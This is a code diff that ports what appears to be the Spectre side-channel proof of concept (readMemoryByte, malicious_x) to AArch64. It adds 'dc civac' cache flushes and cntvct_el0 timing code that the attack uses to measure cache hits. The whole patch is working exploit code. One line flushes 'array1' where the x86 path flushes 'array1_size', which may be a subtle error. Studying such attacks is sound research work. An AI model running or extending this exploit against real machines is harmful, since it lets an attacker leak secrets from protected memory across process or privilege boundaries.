@@ -162,6 +162,9 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     /* Flush array2[512*(0..255)] from cache */
     for (i = 0; i < 256; i++)
       _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
+#elif defined(__aarch64__)
+    for (i = 0; i < 256; i++)
+      asm volatile("dc civac %0" : : "r"(&array2[i * 512]): "memory");
 #elif defined(__x86_64__)
     /* Flush array2[256*(0..255)] from cache
        using long SSE instruction several times */
@@ -175,6 +178,8 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     for (j = 29; j >= 0; j--) {
 #ifndef NOCLFLUSH
       _mm_clflush( & array1_size);
+#elif defined(__aarch64__)
+      asm volatile("dc civac %0" : : "r"(&array1): "memory");
 #elif defined(__x86_64__)
       /* Alternative to using clflush to flush the CPU cache */
       /* Read addresses at 4096-byte intervals out of a large array.
@@ -216,6 +221,11 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       time1 = __rdtscp( & junk); /* READ TIMER */
       junk = * addr; /* MEMORY ACCESS TO TIME */
       time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+#elif defined(__aarch64__)
+      asm volatile("dsb sy\n isb\n mrs %0, cntvct_el0\n isb\n dsb sy" : "=r" (time1));
+      junk = * addr; /* MEMORY ACCESS TO TIME */
+      asm volatile("dsb sy\n isb\n mrs %0, cntvct_el0\n isb\n dsb sy" : "=r" (time2));
+      time2 -= time1;
 #elif defined(__x86_64__)
 
     /*
